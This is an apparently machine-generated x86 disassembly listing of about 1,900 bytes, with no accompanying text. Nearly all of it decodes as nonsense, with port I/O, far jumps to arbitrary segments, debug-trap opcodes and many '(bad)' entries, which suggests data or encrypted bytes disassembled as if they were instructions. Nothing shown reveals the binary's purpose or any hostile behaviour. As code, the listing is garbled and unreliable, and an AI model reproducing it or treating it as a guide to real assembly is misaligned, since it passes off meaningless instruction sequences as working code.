  40fcf5:	jne    0x41195a
  40fcfb:	jmp    0x410285
  40fd00:	shl    BYTE PTR [eax-0x5b],0xd6
  40fd04:	and    eax,0x48609832
  40fd09:	and    dl,ah
  40fd0b:	test   al,0x72
  40fd0d:	arpl   ax,bx
  40fd0f:	test   al,0x18
  40fd11:	push   0x16
  40fd13:	push   ss
  40fd14:	cmp    eax,0xc8161604
  40fd19:	test   al,ah
  40fd1b:	adc    eax,0xa0e64235
  40fd20:	inc    ecx
  40fd21:	stos   DWORD PTR es:[edi],eax
  40fd22:	sbb    eax,0xb9b8d5f5
  40fd27:	shl    BYTE PTR [esi+0x65],0xd0
  40fd2b:	aas    
  40fd2c:	cmc    
  40fd2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd2e:	jbe    0x40fd4a
  40fd30:	pop    ecx
  40fd31:	out    dx,eax
  40fd32:	inc    eax
  40fd33:	aad    0x11
  40fd35:	scas   eax,DWORD PTR es:[edi]
  40fd36:	sub    bl,bh
  40fd38:	jp     0x40fd2d
  40fd3a:	nop
  40fd3b:	sbb    al,0x24
  40fd3d:	xor    al,0xa7
  40fd3f:	jge    0x40fd8a
  40fd41:	shr    BYTE PTR [ebx],cl
  40fd43:	pop    ss
  40fd44:	xchg   edi,eax
  40fd45:	sar    BYTE PTR [esi+0x64],1
  40fd48:	push   cs
  40fd49:	cld    
  40fd4a:	shl    BYTE PTR [esi],0x29
  40fd4d:	push   ebx
  40fd4e:	jb     0x40fdb7
  40fd50:	movlhps xmm1,xmm3
  40fd53:	jmp    0x8a9b:0x442ddd0d
  40fd5a:	popf   
  40fd5b:	mov    bh,0xfa
  40fd5d:	call   DWORD PTR [edi-0x2786d3fd]
  40fd63:	sahf   
  40fd64:	aas    
  40fd65:	loopne 0x40fd0d
  40fd67:	cli    
  40fd68:	div    DWORD PTR [edi-0xd8b5e92]
  40fd6e:	mov    ch,0x4e
  40fd70:	and    al,0xd3
  40fd72:	xchg   edx,eax
  40fd73:	data16 or al,0xa4
  40fd76:	xor    DWORD PTR [ebp-0x67],esp
  40fd79:	pop    edi
  40fd7a:	xchg   edx,ecx
  40fd7c:	(bad)  
  40fd7d:	cmovns ebx,DWORD PTR [eax]
  40fd80:	retf   
  40fd81:	lds    ebp,FWORD PTR [eax-0x3a95bf5f]
  40fd87:	push   esp
  40fd88:	rcl    BYTE PTR [edx],cl
  40fd8a:	dec    ecx
  40fd8b:	inc    edx
  40fd8c:	inc    ecx
  40fd8d:	adc    al,0x86
  40fd8f:	cmp    al,0x0
  40fd91:	jmp    0x2fb4:0x7ed126b1
  40fd98:	dec    esi
  40fd99:	push   0x14
  40fd9b:	ret    
  40fd9c:	jno    0x40fd28
  40fd9e:	loope  0x40fdd8
  40fda0:	dec    edi
  40fda1:	clc    
  40fda2:	sti    
  40fda3:	addr16 mov eax,ds:0x3e32
  40fda7:	(bad)  
  40fda8:	cdq    
  40fda9:	mov    ecx,0x6de7b765
  40fdae:	push   0x5f9f628a
  40fdb3:	adc    ebp,DWORD PTR [eax]
  40fdb5:	js     0x40fd9f
  40fdb7:	inc    BYTE PTR [eax]
  40fdb9:	xor    dh,bl
  40fdbb:	push   esp
  40fdbc:	xchg   ecx,eax
  40fdbd:	data16 addr16 shr bh,cl
  40fdc1:	inc    edx
  40fdc2:	add    al,0x6a
  40fdc4:	pop    edi
  40fdc5:	mov    WORD PTR [edx],gs
  40fdc7:	std    
  40fdc8:	inc    edx
  40fdc9:	xchg   BYTE PTR [eax+0x680cbd61],dh
  40fdcf:	jb     0x40fd9e
  40fdd1:	pop    es
  40fdd2:	pop    ds
  40fdd3:	push   cs
  40fdd4:	sahf   
  40fdd5:	outs   dx,BYTE PTR ds:[esi]
  40fdd6:	xor    al,0xfd
  40fdd8:	(bad)  
  40fdd9:	sub    al,0x25
  40fddb:	into   
  40fddc:	xlat   BYTE PTR ds:[ebx]
  40fddd:	test   al,0x78
  40fddf:	mov    esi,0x2777570c
  40fde4:	ins    DWORD PTR es:[edi],dx
  40fde5:	test   eax,0xf2a2bc39
  40fdea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdeb:	jne    0x40fdfb
  40fded:	push   ebx
  40fdee:	popf   
  40fdef:	cmp    al,0x6c
  40fdf1:	mov    eax,?
  40fdf3:	xchg   BYTE PTR [ecx-0x6998fd45],ah
  40fdf9:	imul   ebp,eax,0xf690a3ef
  40fdff:	adc    eax,0xe715cca9
  40fe04:	sar    DWORD PTR [esi-0x78c98773],1
  40fe0a:	jbe    0x40fdbc
  40fe0c:	or     dl,BYTE PTR [edx+0x38]
  40fe0f:	or     eax,0xe10ae3fe
  40fe14:	jmp    0x66a:0xaffbbbb5
  40fe1b:	add    BYTE PTR [esi],ah
  40fe1d:	popa   
  40fe1e:	test   DWORD PTR [esi],ebx
  40fe20:	js     0x40fe64
  40fe22:	leave  
  40fe23:	dec    esp
  40fe24:	push   es
  40fe25:	cmp    edi,DWORD PTR [eax-0x3d]
  40fe28:	out    0x41,al
  40fe2a:	jecxz  0x40fdc7
  40fe2c:	sub    BYTE PTR [edx+0x6d],ch
  40fe2f:	shl    eax,cl
  40fe31:	out    0x3e,al
  40fe33:	imul   BYTE PTR [ebx-0x1633a3a]
  40fe39:	xchg   esi,eax
  40fe3a:	sbb    esp,DWORD PTR [ebx]
  40fe3c:	mov    bl,0xe3
  40fe3e:	outs   dx,DWORD PTR ds:[esi]
  40fe3f:	call   0xe976bd55
  40fe44:	mov    eax,0x91573ffb
  40fe49:	(bad)  
  40fe4a:	fisttp DWORD PTR [ebp+0x2a]
  40fe4d:	das    
  40fe4e:	mov    ds:0x37ff2d40,eax
  40fe53:	xchg   ecx,eax
  40fe54:	xchg   BYTE PTR ss:[edx+edx*1+0x763dd7c5],ah
  40fe5c:	cwde   
  40fe5d:	hlt    
  40fe5e:	out    0x4d,eax
  40fe60:	iret   
  40fe61:	adc    DWORD PTR [ebp+0x7f53e8c],ebp
  40fe67:	pop    ecx
  40fe68:	popf   
  40fe69:	test   al,0xa3
  40fe6b:	(bad)  
  40fe6d:	inc    esp
  40fe6e:	push   0xffffffa8
  40fe70:	in     al,0x96
  40fe72:	popa   
  40fe73:	out    dx,al
  40fe74:	out    dx,eax
  40fe75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe76:	mov    ebp,0xbad43f53
  40fe7b:	jmp    0x73912ab7
  40fe80:	out    dx,eax
  40fe81:	popf   
  40fe82:	popa   
  40fe83:	test   dl,al
  40fe85:	test   eax,0xa779e9ea
  40fe8a:	push   ebp
  40fe8b:	dec    edx
  40fe8c:	scas   eax,DWORD PTR es:[edi]
  40fe8d:	call   0x41f2d7f5
  40fe92:	xchg   DWORD PTR [edi+0x7d262007],eax
  40fe98:	sub    dx,si
  40fe9b:	sub    bh,ch
  40fe9d:	sub    ecx,DWORD PTR [ebx]
  40fe9f:	out    0xb6,eax
  40fea1:	cmc    
  40fea2:	adc    ah,bh
  40fea4:	out    dx,al
  40fea5:	push   esp
  40fea6:	sbb    dl,BYTE PTR [ecx+0x20f1a902]
  40feac:	(bad)  
  40fead:	pop    ebx
  40feae:	jns    0x40fe83
  40feb0:	fsub   DWORD PTR [ecx-0x66]
  40feb3:	in     al,dx
  40feb4:	mov    ecx,DWORD PTR [ecx-0x67]
  40feb7:	pop    ebp
  40feb8:	repnz fwait
  40feba:	jnp    0x40fe5f
  40febc:	(bad)  
  40febe:	out    0xa4,eax
  40fec0:	loope  0x40fe4b
  40fec2:	mov    eax,ds:0xa4e3028b
  40fec7:	cmp    al,0xea
  40fec9:	pop    ecx
  40feca:	fidivr WORD PTR [ecx]
  40fecc:	adc    al,0x93
  40fece:	cld    
  40fecf:	rcr    esi,0xd
  40fed2:	add    esi,DWORD PTR ds:0x8cdf54ae
  40fed8:	icebp  
  40fed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feda:	sub    al,0x6c
  40fedc:	mov    dh,0x20
  40fede:	dec    esi
  40fedf:	or     eax,0xf2e1a577
  40fee4:	lds    eax,FWORD PTR [ebx+0x71]
  40fee7:	mov    ebp,0x82412952
  40feec:	shl    BYTE PTR [edi+0x64],cl
  40feef:	addr16 mov ch,0x99
  40fef2:	sbb    esi,esi
  40fef4:	es icebp 
  40fef6:	add    eax,0x1e17debe
  40fefb:	adc    eax,0xa2c4e569
  40ff00:	xchg   BYTE PTR [edx+0x37a64406],bh
  40ff06:	bound  esp,QWORD PTR [esi]
  40ff08:	mov    BYTE PTR [edx-0x16],bl
  40ff0b:	push   es
  40ff0c:	lds    ecx,FWORD PTR [esi-0x53]
  40ff0f:	pop    esi
  40ff10:	ds idiv ch
  40ff13:	jb     0x40fece
  40ff15:	imul   edx,DWORD PTR [esi+0x19bae32e],0xffffffe5
  40ff1c:	or     ebp,eax
  40ff1e:	inc    eax
  40ff1f:	out    dx,eax
  40ff20:	in     eax,0xfb
  40ff22:	je     0x40ffa3
  40ff24:	es call 0x7cc0:0xc5105c17
  40ff2c:	sbb    BYTE PTR [edx],al
  40ff2e:	push   esi
  40ff2f:	test   ah,ah
  40ff31:	or     eax,0x156b67fb
  40ff36:	and    DWORD PTR ds:0x768e1a61,ebp
  40ff3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff3d:	js     0x40ff52
  40ff3f:	or     DWORD PTR [esi],ebp
  40ff41:	mov    ds:0x7ba77a2a,eax
  40ff46:	xor    al,dl
  40ff48:	mov    eax,0xbbad6944
  40ff4d:	mov    al,bl
  40ff4f:	mov    al,0x73
  40ff51:	stc    
  40ff52:	mov    DWORD PTR [ecx],esi
  40ff54:	das    
  40ff55:	lods   eax,DWORD PTR ds:[esi]
  40ff56:	jle    0x40ff09
  40ff58:	ror    DWORD PTR ss:[ebp+0x75],cl
  40ff5c:	xchg   esi,eax
  40ff5d:	dec    esi
  40ff5e:	ins    BYTE PTR es:[edi],dx
  40ff5f:	stos   BYTE PTR es:[edi],al
  40ff60:	jo     0x40fef4
  40ff62:	test   eax,0x9e7ea6af
  40ff67:	scas   al,BYTE PTR es:[edi]
  40ff68:	mov    dh,0x86
  40ff6a:	pusha  
  40ff6b:	mov    ss,ebp
  40ff6d:	xchg   edi,eax
  40ff6e:	test   DWORD PTR [ebp+0x247e7809],ecx
  40ff74:	sar    ah,cl
  40ff76:	arpl   WORD PTR [eax+ecx*8],bp
  40ff79:	xor    ah,BYTE PTR [ecx]
  40ff7b:	and    al,0x82
  40ff7d:	adc    edx,edx
  40ff7f:	out    0xfa,eax
  40ff81:	das    
  40ff82:	clc    
  40ff83:	mov    ds:0x696785d1,eax
  40ff88:	lock mov DWORD PTR [eax-0x3e8e28f5],eax
  40ff8f:	repnz cs stc 
  40ff92:	fld    QWORD PTR [edi+0x4d]
  40ff95:	fs icebp 
  40ff97:	mov    ah,0x80
  40ff99:	mov    cl,bl
  40ff9b:	xchg   edx,eax
  40ff9c:	and    al,0xbd
  40ff9e:	std    
  40ff9f:	adc    eax,0x1474830c
  40ffa4:	xor    BYTE PTR [esi],cl
  40ffa6:	loope  0x40fff9
  40ffa8:	sahf   
  40ffa9:	jb     0x410008
  40ffab:	inc    edi
  40ffac:	xchg   edi,eax
  40ffad:	ror    BYTE PTR [eax-0x392f252b],0xcd
  40ffb4:	ret    0x3bd9
  40ffb7:	inc    ecx
  40ffb8:	rcl    BYTE PTR [eax],cl
  40ffba:	sbb    ecx,edi
  40ffbc:	jbe    0x40ff89
  40ffbe:	mov    ds:0xc6731903,al
  40ffc3:	sahf   
  40ffc4:	jg     0x410013
  40ffc6:	jmp    0xf13f:0xd4a73f7a
  40ffcd:	shl    BYTE PTR [edx+0x26],cl
  40ffd0:	dec    eax
  40ffd1:	xor    dh,bh
  40ffd3:	lods   al,BYTE PTR ds:[esi]
  40ffd4:	push   edx
  40ffd5:	ins    BYTE PTR es:[edi],dx
  40ffd6:	sbb    eax,0x96378ab
  40ffdb:	jge    0x410015
  40ffdd:	push   ds
  40ffde:	dec    eax
  40ffdf:	outs   dx,DWORD PTR ds:[esi]
  40ffe0:	mov    ebx,0x5a9f9253
  40ffe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe6:	jle    0x40ffcb
  40ffe8:	mov    edx,0x65ca638b
  40ffed:	js     0x40ffc0
  40ffef:	ss mov cl,0x41
  40fff2:	lea    ebx,[ebp+edx*4-0x5ecc9f38]
  40fff9:	int3   
  40fffa:	adc    ebp,DWORD PTR [esi]
  40fffc:	sbb    esi,eax
  40fffe:	push   es
  40ffff:	cmp    ecx,DWORD PTR [edx+0x23]
  410002:	sub    eax,0x94ac712f
  410007:	jmp    0x410072
  410009:	stc    
  41000a:	jmp    0xf25f:0xfdc2ee59
  410011:	out    0xef,al
  410013:	add    al,0xba
  410015:	fcomip st,st(7)
  410017:	cdq    
  410018:	jmp    DWORD PTR [ebx]
  41001a:	loopne 0x41006b
  41001c:	cmp    eax,0x4c22c85c
  410021:	shl    BYTE PTR [ebx],0x3c
  410024:	inc    edi
  410025:	mov    al,ds:0x7f0bb3b1
  41002a:	sub    dl,BYTE PTR [edx+0x7d]
  41002d:	int3   
  41002e:	cld    
  41002f:	retf   
  410030:	sahf   
  410031:	sbb    dh,BYTE PTR [ebx-0x1f4fb7b7]
  410037:	pop    ds
  410038:	inc    esp
  410039:	sub    DWORD PTR [ecx],ebp
  41003b:	mov    dh,0x79
  41003d:	adc    eax,0xe4e761f6
  410042:	mov    ch,0x54
  410044:	addr16 and ah,0x51
  410048:	out    dx,al
  410049:	and    eax,0xa7f76813
  41004e:	stc    
  41004f:	imul   eax,DWORD PTR [ebx],0xffffffd5
  410052:	xor    eax,0x25f215f2
  410057:	std    
  410058:	mov    DWORD PTR [ebx],ebp
  41005a:	aad    0xa4
  41005c:	shl    DWORD PTR [ecx-0x7cb3e9e7],cl
  410062:	into   
  410063:	mov    eax,ds:0x1f7a0da5
  410068:	xchg   ecx,eax
  410069:	mov    DWORD PTR [ebx],ebp
  41006b:	fxam   
  41006d:	inc    esp
  41006e:	mov    cl,0x72
  410070:	mov    esi,0x5f29b44c
  410075:	lea    ebx,[ebp-0x3]
  410078:	xor    edx,0x98587b48
  41007e:	ret    0x7b90
  410081:	out    0x37,eax
  410083:	adc    bl,BYTE PTR es:[eax-0x4970e573]
  41008a:	xor    al,BYTE PTR [ecx]
  41008c:	jmp    0x3ca2:0x5460283c
  410093:	adc    DWORD PTR [edx+0x4c8b674c],ebp
  410099:	addr16 cmc 
  41009b:	(bad)  
  41009c:	in     eax,dx
  41009d:	fst    QWORD PTR [eax]
  41009f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100a0:	xor    al,BYTE PTR [edi-0x61]
  4100a3:	and    esp,DWORD PTR [esp+ebx*1]
  4100a6:	xchg   ebx,eax
  4100a7:	dec    edx
  4100a8:	pusha  
  4100a9:	mov    ebx,0xa83a3787
  4100ae:	xchg   esi,eax
  4100af:	and    eax,0x4c323025
  4100b4:	or     dl,cl
  4100b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100b7:	jb     0x410130
  4100b9:	jb     0x41011d
  4100bb:	xchg   edi,eax
  4100bc:	in     eax,0x32
  4100be:	xchg   DWORD PTR [ebp+eax*1+0x76],edx
  4100c2:	iret   
  4100c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100c4:	iret   
  4100c5:	dec    eax
  4100c6:	imul   eax,esp,0x9e15fa23
  4100cc:	ret    0x5dd
  4100cf:	pop    edx
  4100d0:	popf   
  4100d1:	sbb    ah,BYTE PTR [edx+0x63fdf478]
  4100d7:	sahf   
  4100d8:	xchg   esi,ebx
  4100da:	fucomp st(3)
  4100dc:	jne    0x4100da
  4100de:	mov    dh,0x3e
  4100e0:	mov    ebx,0xc06a7be0
  4100e5:	fwait
  4100e6:	imul   BYTE PTR [ecx-0x578a09d4]
  4100ec:	mov    bl,0x3e
  4100ee:	repnz xchg edi,eax
  4100f0:	sbb    al,0xf1
  4100f2:	out    dx,al
  4100f3:	add    eax,edi
  4100f5:	pop    ebp
  4100f6:	push   edx
  4100f7:	cld    
  4100f8:	xor    al,0x63
  4100fa:	mov    cr7,ebp
  4100fd:	aam    0x41
  4100ff:	adc    al,0x1d
  410101:	(bad)  
  410102:	sub    BYTE PTR [ebx+0x0],al
  410105:	cdq    
  410106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410107:	inc    esp
  410108:	out    dx,al
  410109:	icebp  
  41010a:	imul   ecx,DWORD PTR [edx+0x0],0xffffffbb
  41010e:	mov    bh,0x4
  410110:	mov    esi,0x6dd7a12b
  410115:	mov    eax,0x34fe73c
  41011a:	pop    ecx
  41011b:	aaa    
  41011c:	cmp    eax,0xf89b5eaf
  410121:	in     al,0x57
  410123:	pop    esp
  410124:	sbb    eax,0xd0b72297
  410129:	ss mov ecx,0xfc5fa807
  41012f:	xchg   BYTE PTR [ebp+0x49],ah
  410132:	jmp    0x410166
  410134:	jns    0x410145
  410136:	sub    al,0x2b
  410138:	xchg   edi,eax
  410139:	sbb    BYTE PTR [edx],0x12
  41013c:	lahf   
  41013d:	sbb    eax,0x9ee1e65
  410142:	sub    DWORD PTR [eax],esi
  410144:	out    0xc6,al
  410146:	int3   
  410147:	adc    ch,BYTE PTR [edi-0x4495ea28]
  41014d:	mov    DWORD PTR [edx-0x33f3c44d],0x35ce2ae3
  410157:	xchg   ecx,eax
  410158:	adc    eax,0x1ee85f22
  41015d:	mov    ch,0xf0
  41015f:	mov    BYTE PTR [ebp+0x16cc8f92],dh
  410165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410166:	scas   eax,DWORD PTR es:[edi]
  410167:	mov    ds:0xaa4bc257,eax
  41016c:	inc    esp
  41016d:	mov    eax,ds:0xad8bc0d3
  410172:	jb     0x41019a
  410174:	cmp    eax,0x42119d1
  410179:	xor    al,0x9f
  41017b:	sub    eax,0xffe84090
  410180:	fisubr WORD PTR [edi-0x6322fdd8]
  410186:	sbb    BYTE PTR [ebx+0x59],0x7
  41018a:	icebp  
  41018b:	or     BYTE PTR [eax-0x2f50cf4d],0xd8
  410192:	iret   
  410193:	push   ss
  410194:	in     al,dx
  410195:	mov    al,0xed
  410197:	mov    esi,0xda4821d1
  41019c:	push   ebp
  41019d:	outs   dx,DWORD PTR ds:[esi]
  41019e:	sbb    edx,ecx
  4101a0:	stos   DWORD PTR es:[edi],eax
  4101a1:	imul   eax,DWORD PTR [edi],0x65
  4101a4:	sbb    al,0xc0
  4101a6:	xchg   esi,eax
  4101a7:	cli    
  4101a8:	into   
  4101a9:	into   
  4101aa:	push   cs
  4101ab:	outs   dx,BYTE PTR ds:[esi]
  4101ac:	aad    0xb1
  4101ae:	in     al,0xd6
  4101b0:	cmp    DWORD PTR [ecx+0x4a582483],0x3a365fcf
  4101ba:	push   ebx
  4101bb:	jo     0x410185
  4101bd:	dec    ecx
  4101be:	mov    dh,0x8
  4101c0:	shr    BYTE PTR [ecx],cl
  4101c2:	jmp    0xbbac351a
  4101c7:	fld    st(6)
  4101c9:	push   esp
  4101ca:	and    DWORD PTR [ebp+0x3a2801d4],edi
  4101d0:	out    0x5a,eax
  4101d2:	les    ebx,FWORD PTR [edx+0x1cd5d3ac]
  4101d8:	push   0x9
  4101da:	jo     0x410181
  4101dc:	jmp    0x41024d
  4101de:	and    eax,0x29a5cd0a
  4101e3:	fadd   DWORD PTR [ebp-0x18]
  4101e6:	stos   DWORD PTR es:[edi],eax
  4101e7:	cmp    DWORD PTR [edi],ecx
  4101e9:	xchg   edi,eax
  4101ea:	sahf   
  4101eb:	and    cl,0x81
  4101ee:	pushf  
  4101ef:	popa   
  4101f0:	repnz mov ah,0x8f
  4101f3:	fcmovnbe st,st(0)
  4101f5:	repz mov ds:0x529fb00c,al
  4101fb:	shl    DWORD PTR [edx-0x6cf1973d],0xdd
  410202:	sub    DWORD PTR [esi+0x2c],0xffffff9d
  410206:	daa    
  410207:	fs xchg esi,eax
  410209:	add    DWORD PTR [eax+0x25666052],ebp
  41020f:	hlt    
  410210:	fisub  WORD PTR [ebx-0x26]
  410213:	mov    edx,0x9d3b62ba
  410218:	in     al,0x17
  41021a:	mov    cl,0xf1
  41021c:	mov    eax,ds:0xb993b061
  410221:	xor    BYTE PTR [edx+0x5a],0x85
  410225:	dec    esp
  410226:	cdq    
  410227:	inc    esp
  410228:	imul   esp,DWORD PTR [ebp-0x74a30c71],0x82c8445b
  410232:	test   BYTE PTR [ebx-0x4facb6c0],bl
  410238:	iret   
  410239:	addr16 call 0x4d9af496
  41023f:	mov    edx,0x912e7292
  410244:	or     ecx,0x1ffec87b
  41024a:	pusha  
  41024b:	out    0x76,al
  41024d:	jg     0x410210
  41024f:	(bad)  
  410251:	mov    WORD PTR [esi+0x23a9aefc],ds
  410257:	or     ebp,DWORD PTR [edi]
  410259:	ja     0x4102ce
  41025b:	jns    0x4101e8
  41025d:	jno    0x4102d4
  41025f:	sub    BYTE PTR [ebp+esi*2+0x1dcc455a],ch
  410266:	sub    ecx,DWORD PTR [esi+eax*2]
  410269:	daa    
  41026a:	je     0x4101fe
  41026c:	mov    ch,0xcf
  41026e:	jne    0x41025a
  410270:	mov    ah,0x59
  410272:	icebp  
  410273:	push   edx
  410274:	adc    BYTE PTR [edx],cl
  410276:	jmp    0x83d4:0x56d666cc
  41027d:	add    al,0xf0
  41027f:	xchg   DWORD PTR [ecx],ecx
  410281:	pop    edx
  410282:	sub    al,0xfd
  410284:	ror    DWORD PTR [ebx+0xc4539c2],0xf
  41028b:	test   edx,ecx
  41028d:	push   ss
  41028e:	add    BYTE PTR [eax],al
  410290:	mov    eax,DWORD PTR [esi]
  410292:	mov    edx,DWORD PTR [esi+0x4]
  410295:	mov    eax,DWORD PTR [esi]
  410297:	mov    edx,DWORD PTR [esi+0x4]
  41029a:	mov    edx,eax
  41029c:	jmp    0x410826
  4102a1:	shr    esi,cl
  4102a3:	ror    dh,cl
  4102a5:	shl    BYTE PTR [edx-0x1e636d6d],cl
  4102ab:	loopne 0x410321
  4102ad:	mov    dh,0xe
  4102af:	sub    al,0xb4
  4102b1:	inc    edi
  4102b2:	pushw  ss
  4102b4:	push   ss
  4102b5:	cmp    eax,0x59161604
  4102ba:	dec    ebx
  4102bc:	out    dx,al
  4102bd:	inc    ecx
  4102be:	or     dh,cl
  4102c0:	push   0x4cc1eac5
  4102c5:	mov    ax,0x643e
  4102c9:	or     dh,ah
  4102cb:	fild   QWORD PTR [edx+0x3990fc31]
  4102d1:	inc    DWORD PTR [edx-0xd]
  4102d4:	ins    DWORD PTR es:[edi],dx
  4102d5:	mov    al,ds:0xf5e6d5e4
  4102da:	xor    esi,DWORD PTR [eax+0x76ad0399]
  4102e0:	xchg   ebx,eax
  4102e1:	push   ebp
  4102e2:	stc    
  4102e3:	dec    ecx
  4102e4:	push   es
  4102e5:	aaa    
  4102e6:	std    
  4102e7:	inc    edx
  4102e8:	cmp    ah,BYTE PTR [esi]
  4102ea:	mov    eax,ds:0x881b8c66
  4102ef:	xchg   esi,eax
  4102f0:	jmp    0x4102ed
  4102f2:	je     0x41035f
  4102f4:	int    0x39
  4102f6:	xchg   DWORD PTR [edx+0x2d],eax
  4102f9:	daa    
  4102fa:	daa    
  4102fb:	fs pop edx
  4102fd:	cmc    
  4102fe:	ficom  WORD PTR [esi+0x58]
  410301:	div    DWORD PTR [ebp-0x2091dd53]
  410307:	lods   eax,DWORD PTR ds:[esi]
  410308:	sub    al,0xf2
  41030a:	call   0x63b6d07e
  41030f:	push   ebp
  410310:	ds sub eax,DWORD PTR gs:[ecx+0x41]
  410315:	dec    ebx
  410316:	clc    
  410317:	leave  
  410318:	sbb    edx,DWORD PTR [esi+0x1b427769]
  41031e:	sub    BYTE PTR [edi+0x4b63269d],bh
  410324:	ret    
  410325:	test   BYTE PTR [ecx-0x62],cl
  410328:	push   ebp
  410329:	sahf   
  41032a:	sub    edi,esp
  41032c:	cwde   
  41032d:	bound  esi,QWORD PTR [ecx]
  41032f:	pop    ss
  410330:	in     eax,dx
  410331:	push   esi
  410332:	sbb    bl,BYTE PTR [edx]
  410334:	xchg   edx,eax
  410335:	je     0x4102da
  410337:	add    eax,0xf5d93d4a
  41033c:	outs   dx,BYTE PTR ds:[esi]
  41033d:	lahf   
  41033e:	jno    0x410338
  410340:	add    eax,0xe53810ca
  410345:	and    al,0x61
  410347:	pop    esi
  410348:	int    0x85
  41034a:	sar    BYTE PTR [edi-0xba6bdae],1
  410350:	sahf   
  410351:	fwait
  410352:	xchg   ecx,eax
  410353:	and    eax,0xf0e6e26b
  410358:	mov    ebp,0x17068e9d
  41035d:	or     DWORD PTR [eax-0x4d],ebx
  410360:	jmp    0x410393
  410362:	(bad)  [edi]
  410364:	dec    eax
  410365:	lahf   
  410366:	push   0x5fd5f954
  41036b:	je     0x410343
  41036d:	and    ch,BYTE PTR [esi+0x58f3183f]
  410373:	push   0xc82ebd3a
  410378:	or     eax,ebx
  41037a:	adc    bh,BYTE PTR [ecx]
  41037c:	out    0x55,al
  41037e:	mov    ch,0xdd
  410380:	leave  
  410381:	push   es
  410382:	fimul  DWORD PTR [ebx-0x5645abe9]
  410388:	ins    DWORD PTR es:[edi],dx
  410389:	lea    esp,[edx]
  41038b:	dec    ebx
  41038c:	mov    eax,0xdf319ca4
  410391:	lock test dh,0x70
  410395:	mov    ebp,0x257ff714
  41039a:	in     al,dx
  41039b:	jbe    0x4103df
  41039d:	adc    ebx,DWORD PTR [esi-0x6610da9e]
  4103a3:	mov    cl,ch
  4103a5:	mov    WORD PTR [ecx-0x30255acb],cs
  4103ab:	and    BYTE PTR [esi-0x375fb218],al
  4103b1:	jmp    0x4103e2
  4103b3:	push   es
  4103b4:	int3   
  4103b5:	adc    BYTE PTR [esi-0x11],0xed
  4103b9:	out    dx,al
  4103ba:	adc    eax,0x51cd3c1f
  4103bf:	sub    eax,0xed4a51c
  4103c4:	and    dh,BYTE PTR [ecx]
  4103c6:	or     DWORD PTR [ecx+ebx*1-0x1b],edx
  4103ca:	or     dh,bh
  4103cc:	lahf   
  4103cd:	(bad)  
  4103ce:	icebp  
  4103cf:	les    esp,FWORD PTR [esi]
  4103d1:	(bad)  
  4103d3:	(bad)  
  4103d4:	jno    0x41038d
  4103d6:	sbb    esi,edx
  4103d8:	test   eax,0x6fc7fe85
  4103dd:	jb     0x4103b8
  4103df:	inc    edx
  4103e0:	and    BYTE PTR [ecx],bl
  4103e2:	retf   0x855e
  4103e5:	cmp    edx,edi
  4103e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103e8:	xor    al,0x13
  4103ea:	lock jmp 0x7c69c55b
  4103f0:	sbb    ch,BYTE PTR [ecx-0x72]
  4103f3:	dec    ecx
  4103f4:	add    DWORD PTR [edx-0x57],ebp
  4103f7:	xchg   edi,eax
  4103f8:	jge    0x410426
  4103fa:	inc    edx
  4103fb:	sub    BYTE PTR [esp+edi*1-0x5ce9325c],ch
  410402:	adc    eax,0xffa29ea2
  410407:	shl    esi,cl
  410409:	out    0x5f,al
  41040b:	jb     0x41038d
  41040d:	sub    esi,edx
  41040f:	aam    0x91
  410411:	imul   ecx,DWORD PTR [ebp+eiz*8+0x3e],0xfffffff7
  410416:	pop    ebx
  410417:	xchg   edx,eax
  410418:	dec    ebx
  410419:	inc    edx
  41041a:	leave  
  41041b:	ja     0x41045b
  41041d:	jno    0x410449
  41041f:	sub    al,0x9f
  410421:	loop   0x410489
  410423:	ror    BYTE PTR [edx+0x3],1
  410426:	loopne 0x410431
  410428:	adc    BYTE PTR [esi+0x4c5e05b9],dh
  41042e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41042f:	xchg   ecx,eax
  410430:	das    
  410431:	dec    edx
  410432:	jle    0x4104a7
  410434:	xor    al,0xb
  410436:	jg     0x410465
  410438:	jo     0x4104ad
  41043a:	imul   esp,ecx,0x5d
  41043d:	fbld   TBYTE PTR [ebx+0x49]
  410440:	cmp    BYTE PTR [eax-0x6b85bd95],cl
  410446:	inc    esi
  410447:	inc    edi
  410448:	pop    esp
  410449:	mov    al,0xcb
  41044b:	es mov ebx,0xd01202c4
  410451:	or     DWORD PTR [edi-0x71147afc],edx
  410457:	imul   eax,DWORD PTR [esi],0xd83fc274
  41045d:	adc    BYTE PTR [ebp+ecx*8+0x488869be],al
  410464:	mov    bh,0xa4
  410466:	pop    edi
  410467:	out    0x1b,eax
  410469:	ss out dx,eax
  41046b:	jl     0x4104a2
  41046d:	xchg   esi,eax
  41046e:	xor    BYTE PTR [ecx-0x61],al
  410471:	arpl   WORD PTR [ebx+0x31],dx
  410474:	mov    cl,0x61
  410476:	jecxz  0x4104b4
  410478:	push   ds
  410479:	cs stc 
  41047b:	cwde   
  41047c:	popa   
  41047d:	xchg   esi,eax
  41047e:	and    al,0x95
  410480:	xor    al,0x26
  410482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410483:	cld    
  410484:	inc    edx
  410485:	(bad)  
  410486:	xchg   DWORD PTR [edx+ebx*4],ecx
  410489:	stos   BYTE PTR es:[edi],al
  41048a:	mov    es,WORD PTR [ecx]
  41048c:	(bad)  
  41048d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41048e:	hlt    
  41048f:	idiv   DWORD PTR [ebx]
  410491:	push   ebx
  410492:	mov    ds:0xe44dc8a0,al
  410497:	xchg   edi,eax
  410498:	mov    al,ds:0x5a74ff2b
  41049d:	jns    0x410492
  41049f:	fwait
  4104a0:	sysenter 
  4104a2:	lods   al,BYTE PTR ds:[esi]
  4104a3:	jae    0x4104fa
  4104a5:	cdq    
  4104a6:	pop    ds
